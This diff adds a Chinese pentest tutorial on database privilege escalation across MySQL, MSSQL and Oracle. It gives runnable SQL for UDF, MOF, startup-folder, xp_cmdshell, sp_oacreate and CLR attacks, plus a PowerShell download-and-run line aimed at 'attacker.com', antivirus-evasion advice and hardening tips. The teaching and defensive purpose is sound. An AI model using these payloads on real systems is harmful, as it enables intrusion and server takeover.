@@ -1,0 +1,228 @@
+## 1. 概述 (Overview)
+
+在 Web 渗透测试中，当我们成功获取到 WebShell 或某个低权限的系统访问权限后，下一个关键目标通常是提升权限（Privilege Escalation），以获得对目标服务器的完全控制。在 Windows 环境中，配置不当或存在漏洞的数据库服务是权限提升的常见突破口。
+
+本篇笔记专注于探讨当攻击者已经获得 Web 应用权限后，如何利用 **MySQL**、**MSSQL** 和 **Oracle** 这三种主流数据库服务，从 Web 用户权限提升至数据库高权限用户，乃至操作系统级别的 `SYSTEM` 权限。我们将详细拆解提权的通用流程、核心技术原理、环境准备、实战示例及关键细节。
+
+## 2. 技术原理 (Technical Principles)
+
+数据库提权的本质是利用数据库服务自身提供的高权限功能或已知漏洞，去执行超出当前 Web 应用权限范围的操作系统命令。由于数据库服务（如 MSSQL Server、Oracle Service）通常以高权限账户（如 `NT AUTHORITY\SYSTEM` 或 `LocalSystem`）运行，因此通过数据库执行的命令也可能继承这些权限。
+
+### 提权流程模型
+
+一个典型的数据库提权流程可以概括为以下几个阶段：
+
+1.  **信息收集与凭证获取**: 定位数据库类型、版本和端口，并通过各种手段获取有效的数据库连接凭证。
+2.  **连接与环境探测**: 使用获取的凭证尝试连接数据库，并判断当前环境（如是否支持外连、当前用户权限等）。
+3.  **障碍排除 (如外连限制)**: 如果数据库不允许外部直接连接，需要利用已有的 WebShell 权限建立代理隧道或修改数据库配置以开放远程访问。
+4.  **执行提权载荷 (Payload)**: 根据数据库类型和版本，选择并执行相应的提权技术（如 UDF、xp_cmdshell、CLR 等）。
+5.  **获取系统权限**: 成功执行载荷后，获得一个高权限的 Shell 或反弹 Shell，完成提权。
+
+## 3. 环境准备 (Environment Preparation)
+
+### 3.1 凭证获取
+
+在实战开始前，必须先获取数据库的连接凭证。常见途径包括：
+
+*   **SQL 注入漏洞**: 通过 Web 应用的 SQL 注入漏洞直接或间接获取数据库管理员密码。
+*   **配置文件泄露**: 在 Web 应用的源码中寻找数据库连接配置文件，如 `web.config`、`application.properties`、`.env` 等。
+*   **备份文件泄露**: 网站管理员错误地将数据库备份文件（如 `.sql`, `.bak`）放置在 Web 目录下，导致可被直接下载。
+*   **暴力破解**: 在确认数据库端口可访问的情况下，使用密码字典对常见用户名（如 `root`, `sa`）进行爆破。这通常需要解决外连问题。
+
+### 3.2 提权工具
+
+为了简化和自动化提权过程，社区开发了许多优秀的集成工具。
+
+*   **MDUT (Multiple Database Utilization Tools)**: 一款功能强大的跨平台数据库利用工具，集成了多种数据库的提权方法。
+    *   原版项目: `https://github.com/SafeGroceryStore/MDUT`
+    *   扩展版本: `https://github.com/DeEpinGh0st/MDUT-Extend-Release`
+*   **DatabaseTools**: 另一款专注于数据库渗透的工具集。
+    *   项目地址: `https://github.com/Hel10-Web/Databasetools`
+
+### 3.3 解决外连限制
+
+在很多生产环境中，数据库服务器出于安全考虑，会禁止来自任意主机（`%`）的远程连接。此时，我们需要利用已有的 Web 权限来绕过此限制。
+
+*   **建立代理隧道**: 利用已有的 WebShell，在目标服务器上部署代理工具（如 `reGeorg`, `Neo-reGeorg`），将本地的数据库连接请求通过 HTTP/HTTPS 隧道转发至目标数据库端口。这样，对于数据库而言，连接请求来自于本地（`127.0.0.1`），从而绕过外连限制。
+
+*   **修改数据库配置 (需高权限)**: 如果已获取的 Web 权限或数据库权限足够高，可以直接执行 SQL 命令来开启外连。
+
+    *   **MySQL**:
+        ```sql
+        -- 授予 'your_user' 用户从任何主机 ('%') 连接的权限
+        GRANT ALL PRIVILEGES ON *.* TO 'your_user'@'%' IDENTIFIED BY 'your_password' WITH GRANT OPTION;
+        -- 刷新权限使其立即生效
+        FLUSH PRIVILEGES;
+        ```
+
+    *   **MSSQL**:
+        ```sql
+        -- 开启高级选项
+        EXEC sp_configure 'show advanced options', 1;
+        RECONFIGURE;
+        -- 启用 "Ad Hoc Distributed Queries" 功能，有时用于跨服务器查询，也可能与提权相关
+        EXEC sp_configure 'Ad Hoc Distributed Queries', 1;
+        RECONFIGURE;
+        ```
+
+    *   **Oracle**:
+        ```sql
+        -- Oracle 的远程连接通常通过监听配置（listener.ora）和网络服务名配置（tnsnames.ora）管理，
+        -- 较少通过纯 SQL 命令直接开关。但以下命令与密码文件认证相关。
+        ALTER SYSTEM SET REMOTE_LOGIN_PASSWORDFILE=EXCLUSIVE SCOPE=SPFILE;
+        SHUTDOWN IMMEDIATE;
+        STARTUP;
+        ```
+
+## 4. 实战示例 (Practical Examples)
+
+以下将分别介绍针对不同数据库的提权技术和条件。
+
+### 4.1 MySQL 提权
+
+通常与 `PHP + MySQL` 网站环境关联。
+
+*   **前提条件**:
+    1.  获取到数据库 `root` 用户的密码。
+    2.  MySQL 的 `secure-file-priv` 配置项未做严格限制。
+        *   `secure-file-priv` 为 `NULL`: 禁止任何导入导出操作。
+        *   `secure-file-priv` 为指定目录: 只允许在该目录下进行导入导出。
+        *   `secure-file-priv` 为空: 不对导入导出目录做限制（**提权的理想条件**）。
+
+*   **核心技术**:
+    *   **UDF (User-Defined Function) 提权**:
+        1.  **原理**: 将一个包含原生操作系统函数的动态链接库（`.dll`）上传到服务器。通过 SQL 查询将该文件写入 `secure-file-priv` 允许的目录（通常是 MySQL 的插件目录）。然后创建自定义函数，将其指向 DLL 中的导出函数（如 `sys_exec`），最后调用这个自定义函数来执行系统命令。
+        2.  **攻击流程**:
+            ```sql
+            -- 1. 查看 secure-file-priv 配置和插件目录
+            SHOW VARIABLES LIKE '%secure_file_priv%';
+            SHOW VARIABLES LIKE 'plugin_dir';
+
+            -- 2. 将 UDF 的 DLL 文件内容（十六进制编码）写入插件目录
+            -- 假设插件目录为 'C:/mysql/lib/plugin/'
+            SELECT 0xDLL_HEX_CONTENT INTO DUMPFILE 'C:/mysql/lib/plugin/udf.dll';
+
+            -- 3. 从 DLL 创建自定义函数
+            CREATE FUNCTION sys_exec RETURNS STRING SONAME 'udf.dll';
+
+            -- 4. 调用函数执行命令
+            SELECT sys_exec('whoami');
+
+            -- 5. 清理痕迹
+            DROP FUNCTION sys_exec;
+            ```
+
+    *   **MOF (Managed Object Format) 提权**:
+        1.  **原理**: 利用 Windows 的 WMI (Windows Management Instrumentation) 机制。通过 SQL 查询将一个恶意的 MOF 文件写入 `C:\Windows\System32\wbem\mof\` 目录。WMI 服务会定期监视此目录，并自动编译执行其中的 `.mof` 文件。我们可以在 MOF 文件中定义一个事件消费者，当特定事件触发时（如定时），执行我们指定的系统命令。
+        2.  **攻击流程**:
+            ```sql
+            -- 构造恶意的 MOF 文件内容（十六进制）
+            -- 该文件会创建一个名为 "evil_class" 的事件消费者，用于执行 'net user hacker hacker /add'
+            SELECT 0xMOF_HEX_CONTENT INTO DUMPFILE 'C:/Windows/System32/wbem/mof/evil.mof';
+            -- 等待 WMI 服务自动加载并执行，之后新用户 'hacker' 将被创建。
+            ```
+
+    *   **启动项提权**:
+        1.  **原理**: 如果有权限向系统或用户的启动项目录写入文件，可以上传一个批处理脚本或可执行文件，等待服务器重启或用户登录后自动执行。
+        2.  **攻击流程**:
+            ```sql
+            -- 将反弹 shell 的批处理脚本写入所有用户的启动目录
+            SELECT "c:\path\to\reverse_shell.bat" INTO OUTFILE 'C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/shell.bat';
+            ```
+
+### 4.2 MSSQL 提权
+
+通常与 `.NET + MSSQL` 网站环境关联。
+
+*   **前提条件**:
+    1.  获取到数据库 `sa` (System Administrator) 用户的密码或同等权限用户的密码。
+
+*   **核心技术**:
+    *   **xp_cmdshell**:
+        1.  **原理**: `xp_cmdshell` 是 MSSQL 提供的一个扩展存储过程，允许数据库执行操作系统命令。默认情况下，在较新版本的 MSSQL 中处于禁用状态。`sa` 权限用户可以重新启用它。
+        2.  **攻击流程**:
+            ```sql
+            -- 1. 启用 xp_cmdshell
+            EXEC sp_configure 'show advanced options', 1;
+            RECONFIGURE;
+            EXEC sp_configure 'xp_cmdshell', 1;
+            RECONFIGURE;
+
+            -- 2. 执行系统命令
+            EXEC xp_cmdshell 'whoami'; -- 通常返回 nt authority\system
+
+            -- 3. 执行下载和执行等复杂操作
+            EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(\'http://attacker.com/shell.ps1\')"';
+
+            -- 4. (可选) 清理痕迹，禁用 xp_cmdshell
+            EXEC sp_configure 'xp_cmdshell', 0;
+            RECONFIGURE;
+            ```
+
+    *   **sp_oacreate**:
+        1.  **原理**: 当 `xp_cmdshell` 被删除或严格限制时，可以利用 `sp_oacreate` 来调用 COM 组件（如 `WScript.Shell`）间接执行系统命令。
+        2.  **攻击流程**:
+            ```sql
+            -- 1. 启用 OLE Automation Procedures
+            EXEC sp_configure 'show advanced options', 1;
+            RECONFIGURE;
+            EXEC sp_configure 'Ole Automation Procedures', 1;
+            RECONFIGURE;
+
+            -- 2. 使用 sp_oacreate 和 sp_oamethod 执行命令
+            DECLARE @shell INT;
+            EXEC sp_oacreate 'WScript.Shell', @shell OUTPUT;
+            EXEC sp_oamethod @shell, 'Run', NULL, 'cmd.exe /c "whoami > C:\temp\output.txt"';
+            ```
+
+    *   **CLR (Common Language Runtime) 集成**:
+        1.  **原理**: MSSQL 允许加载和执行使用 .NET 语言（如 C#）编写的程序集（Assembly）。攻击者可以创建一个恶意的 .NET 程序集，其中包含一个能执行系统命令的静态方法。然后将该程序集加载到数据库中，并创建一个存储过程来调用它。
+        2.  **攻击流程**:
+            ```sql
+            -- 1. 启用 CLR 集成
+            EXEC sp_configure 'clr enabled', 1;
+            RECONFIGURE;
+
+            -- 2. 从十六进制字符串创建程序集 (假设恶意 DLL 已转换为 HEX)
+            CREATE ASSEMBLY MyEvilAssembly FROM 0xDLL_HEX_CONTENT WITH PERMISSION_SET = UNSAFE;
+
+            -- 3. 创建存储过程链接到程序集中的方法
+            CREATE PROCEDURE sp_exec_cmd @cmd NVARCHAR(4000) AS EXTERNAL NAME MyEvilAssembly.StoredProcedures.CmdExec;
+
+            -- 4. 执行命令
+            EXEC sp_exec_cmd 'whoami';
+            ```
+
+### 4.3 Oracle 提权
+
+通常与 `JSP + Oracle` 网站环境关联。
+
+*   **前提条件**:
+    1.  获取到任意一个数据库用户的密码。权限越高，提权路径越短。
+
+*   **核心技术**:
+    *   **DBA 权限**: 如果获取的账户拥有 `DBA` 角色，提权通常非常直接。可以利用 Java 或 PL/SQL 创建一个能执行系统命令的存储过程。
+    *   **普通用户**: 如果是普通用户，需要寻找 Oracle 自身的漏洞（如 CVE-2012-3137）或利用其他可被该用户调用的高权限存储过程来进行权限提升。
+    *   **注入模式**: 在 SQL 注入场景下，即使无法直接执行命令，也可以通过注入来调用恶意的 Java 存储过程或利用 XML 相关函数执行外部实体注入（XXE）来读取文件或探测内网。
+
+## 5. 关键细节 (Key Details)
+
+*   **权限与环境**: 提权的成功率高度依赖于当前获取的权限和目标环境的配置。在动手之前，务必做好充分的信息收集。
+*   **版本差异**: 不同数据库版本对安全配置的默认值和支持的提权方法都不同。例如，新版 MySQL 默认 `secure-file-priv` 配置更严格，新版 MSSQL 默认禁用 `xp_cmdshell`。
+*   **日志与清理**: 所有提权操作都会在数据库和操作系统层面留下日志。在授权测试中，应在报告中注明；在真实攻击场景下，攻击者会尽力清理痕迹（如删除上传的文件、恢复配置、清除日志）。
+*   **免杀与绕过**: 提权过程中使用的工具、脚本和命令很容易被主机安全软件（EDR/AV）检测到。需要对载荷进行免杀处理才能成功执行。
+
+## 6. 安全总结 (Security Summary)
+
+数据库是企业核心资产，也是攻击者提权的关键跳板。为了防范此类攻击，应遵循以下安全最佳实践：
+
+1.  **最小权限原则**: 为 Web 应用分配专用的、低权限的数据库账户，仅授予其必需的 `SELECT`, `INSERT`, `UPDATE`, `DELETE` 等操作权限。严禁 Web 应用使用 `root` 或 `sa` 账户。
+2.  **安全配置**:
+    *   **MySQL**: 严格配置 `secure-file-priv`，禁止其为空。
+    *   **MSSQL**: 保持 `xp_cmdshell`, `sp_oacreate`, `CLR` 等高风险功能处于禁用状态，仅在绝对必要时才由 DBA 临时启用。
+    *   **Oracle**: 及时安装官方安全补丁，避免使用默认密码。
+3.  **网络隔离**: 将数据库服务器放置在独立的网络区域，并使用防火墙策略严格限制可访问数据库的源 IP 地址。禁止从公网直接访问数据库端口。
+4.  **漏洞管理**: 定期对 Web 应用进行安全扫描和渗透测试，及时修复 SQL 注入等可能导致数据库凭证泄露的漏洞。
+5.  **审计与监控**: 开启数据库和操作系统的安全审计功能，对创建高权限用户、启用危险存储过程、执行系统命令等行为进行监控和告警。
+
+---
